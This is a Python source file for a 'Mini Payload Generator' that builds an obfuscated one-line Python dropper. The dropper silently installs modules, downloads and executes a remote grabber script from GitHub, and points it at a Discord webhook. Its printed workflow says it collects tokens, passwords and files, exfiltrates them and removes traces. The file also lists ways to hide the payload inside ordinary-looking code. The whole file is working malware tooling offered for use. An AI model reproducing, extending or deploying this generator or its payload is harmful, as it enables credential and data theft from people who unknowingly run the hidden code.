import os
import sys
import json
import base64
import random
import string
import subprocess
import shutil
from colorama import Fore, Style, init

init()

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

def center(text):
    try:
        width = shutil.get_terminal_size().columns
    except Exception:
        width = 80
    if len(text) >= width:
        return text
    padding = (width - len(text)) // 2
    return " " * max(0, padding) + text

def pretty_print(text, color=(255,64,64)):
    ansi = rgb(*color)
    line = center(text)
    print(ansi + line + '\033[0m')

def generate_random_string(length=8):
    """Generates random variable names"""
    return ''.join(random.choices(string.ascii_letters, k=length))

def obfuscate_text(text):
    """Obfuscates text with Base64"""
    return base64.b64encode(text.encode()).decode()

def create_stealth_payload_with_installer(webhook_url, github_raw_url):
    """Creates a stealth payload with automatic module installation"""
    obf_webhook = obfuscate_text(webhook_url)
    obf_github = obfuscate_text(github_raw_url)
    


    stealth_payload_simple = f'import subprocess,sys;[subprocess.run([sys.executable,"-m","pip","install",m,"--quiet"],capture_output=True)for m in["requests","pycryptodome","psutil"]];import requests,base64;exec(requests.get(base64.b64decode("{obf_github}").decode()).text.replace("WEBHOOK_PLACEHOLDER",base64.b64decode("{obf_webhook}").decode()))'
    

    stealth_payload_safe = f'exec("try:\\n import subprocess,sys\\n [subprocess.run([sys.executable,\\"-m\\",\\"pip\\",\\"install\\",m,\\"--quiet\\"],capture_output=True)for m in[\\"requests\\",\\"pycryptodome\\",\\"psutil\\"]]\\n import requests,base64\\n exec(requests.get(base64.b64decode(\\"{obf_github}\\").decode()).text.replace(\\"WEBHOOK_PLACEHOLDER\\",base64.b64decode(\\"{obf_webhook}\\").decode()))\\nexcept:pass")'
    

    return stealth_payload_simple

def run_mini_payload_generator():
    """Main function for Mini Payload Generator"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    pretty_print("CYBERSEALL MINI PAYLOAD GENERATOR", (255, 0, 0))
    pretty_print("Ultra-short Payloads with GitHub Download", (255, 64, 64))
    print()
    

    webhook_url = input(rgb(255, 32, 32) + center("Enter Discord Webhook URL: ") + '\033[0m')
    if not webhook_url or not webhook_url.strip():
        pretty_print("No webhook URL provided!", (255, 0, 0))
        return
    
    print()

    default_github_url = "https://raw.githubusercontent.com/SellMeFish/TTS-Spammer/main/utils/github_grabber.py"
    github_url = input(rgb(255, 32, 32) + center(f"Enter GitHub Raw URL (Enter for default): ") + '\033[0m')
    if not github_url or not github_url.strip():
        github_url = default_github_url
        pretty_print(f"Using default GitHub URL", (0, 255, 0))
    
    print()
    pretty_print("MINI PAYLOAD GENERATOR", (255, 128, 0))
    print()
    
    pretty_print("FEATURES:", (255, 128, 0))
    features = [
        "Stealth payload with semicolon trick",
        "Automatic module installation",
        "Downloads code from GitHub",
        "Replaces webhook automatically",
        "Maximum stealth with error handling",
        "Instant execution",
        "Automatic trace removal"
    ]
    
    for feature in features:
        print(rgb(150, 255, 150) + center(feature) + '\033[0m')
    
    print()
    confirm = input(rgb(255, 32, 32) + center("Generate Stealth Payload? (y/n): ") + '\033[0m')
    
    if confirm.lower() != 'y':
        pretty_print("Cancelled!", (255, 0, 0))
        return
    
    try:

        stealth_payload = create_stealth_payload_with_installer(webhook_url.strip(), github_url.strip())
        

        with open("stealth_payload.py", 'w', encoding='utf-8') as f:
            f.write(stealth_payload)
        
        pretty_print("Stealth Payload created successfully!", (0, 255, 0))
        print()
        

        pretty_print("PAYLOAD LENGTH:", (255, 128, 0))
        length = len(stealth_payload)
        color = (0, 255, 0) if length < 300 else (255, 255, 0) if length < 400 else (255, 128, 0)
        print(rgb(*color) + center(f"stealth_payload.py: {length} characters") + '\033[0m')
        
        print()
        pretty_print("HIDING METHODS:", (255, 128, 0))
        print()
        

        short_payload = stealth_payload[:80] + "..." if len(stealth_payload) > 80 else stealth_payload
        
        print(rgb(200, 255, 200) + center("# 1. Import hiding:") + '\033[0m')
        print(rgb(150, 255, 150) + center(f"import os; {short_payload}") + '\033[0m')
        print()
        
        print(rgb(200, 255, 200) + center("# 2. Comment hiding:") + '\033[0m')
        print(rgb(150, 255, 150) + center(f"# System check: {short_payload}") + '\033[0m')
        print()
        
        print(rgb(200, 255, 200) + center("# 3. Function hiding:") + '\033[0m')
        print(rgb(150, 255, 150) + center(f"def update(): {short_payload}") + '\033[0m')
        print()
        
        print(rgb(200, 255, 200) + center("# 4. Variable hiding:") + '\033[0m')
        print(rgb(150, 255, 150) + center(f"config = '{short_payload}'") + '\033[0m')
        print()
        
        pretty_print("WORKFLOW:", (255, 128, 0))
        workflow = [
            "1. Automatically installs: requests, pycryptodome, psutil",
            "2. Downloads GitHub Grabber",
            "3. Replaces webhook placeholder",
            "4. Executes complete grabber",
            "5. Collects all data (Tokens, Passwords, Files)",
            "6. Sends results to Discord webhook",
            "7. Automatically cleans all traces"
        ]
        
        for step in workflow:
            print(rgb(150, 255, 150) + center(step) + '\033[0m')
        
        print()
        pretty_print("STEALTH PAYLOAD (With Auto-Installation):", (255, 0, 0))
        print()
        print(rgb(255, 255, 0) + center(stealth_payload) + '\033[0m')
        print()
        pretty_print(f"Length: {len(stealth_payload)} characters", (255, 255, 0))
        pretty_print("Installs all modules automatically!", (255, 0, 0))
        pretty_print("Maximum stealth with error handling!", (255, 0, 0))
        
    except Exception as e:
        pretty_print(f"Error creating payloads: {str(e)}", (255, 0, 0))
    
    print()
    input(rgb(255, 32, 32) + center("Press Enter to continue...") + '\033[0m')

if __name__ == "__main__":
    run_mini_payload_generator() 